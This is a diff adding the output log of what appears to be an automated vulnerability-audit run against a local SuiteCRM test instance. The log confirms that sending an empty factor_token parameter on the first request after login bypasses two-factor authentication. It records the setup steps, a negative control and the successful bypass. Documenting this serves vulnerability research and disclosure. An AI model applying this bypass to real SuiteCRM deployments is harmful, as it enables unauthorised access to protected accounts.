@@ -1,0 +1,20 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-091/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-091/../.venv
+========================================================================
+VULN-091: 2FA bypass: empty factor_token == unset session token
+target: http://localhost:33116
+========================================================================
+[SETUP] admin session established
+[SETUP] created regular user mod_85c76ff2 (id=723e9dd1-19f7-4f5d-af08-6c15191c32bd)
+[SETUP] SMTP catcher listening on 0.0.0.0:33121 (app reaches it at 172.18.0.1:33121)
+[SETUP] PasswordManager saveConfig -> status=302 loc='index.php?module=Administration&action=index' (mail_smtpserver=172.18.0.1:33121, SystemGeneratedPasswordON=True, forgotpasswordON=True)
+[SETUP] Users Save factor_auth=1 for mod_85c76ff2 -> status=301
+[INFO] DB check users.factor_auth for mod_85c76ff2 = '1'
+[STEP] negative control: login, then request Home with NO factor_token param
+[INFO] resp#1 status=200 len=2460 has_otp_challenge_field=True
+[INFO] confirms a real OTP email WAS generated for the negative-control request (subject line below) -- 2FA is genuinely active for this account
+[INFO]   Subject: Two Factor Authentication Code
+[STEP] attack: FRESH session, login, then request Home with factor_token= (empty) as the very FIRST post-login request -- before any OTP has been sent
+[INFO] resp#2 status=200 len=98945 has_otp_challenge_field=False has_auth_markers=['action=Logout', 'Dashboard']
+[PROOF] same account/password: WITHOUT factor_token -> 2460-byte OTP challenge page (2FA enforced, real OTP emailed); WITH factor_token='' on first touch -> 98945-byte fully authenticated Home page, NO OTP ever generated for session #2.
+==> VULN-091: CONFIRMED — empty factor_token bypassed 2FA for mod_85c76ff2; challenge page 2460B vs bypass page 98945B
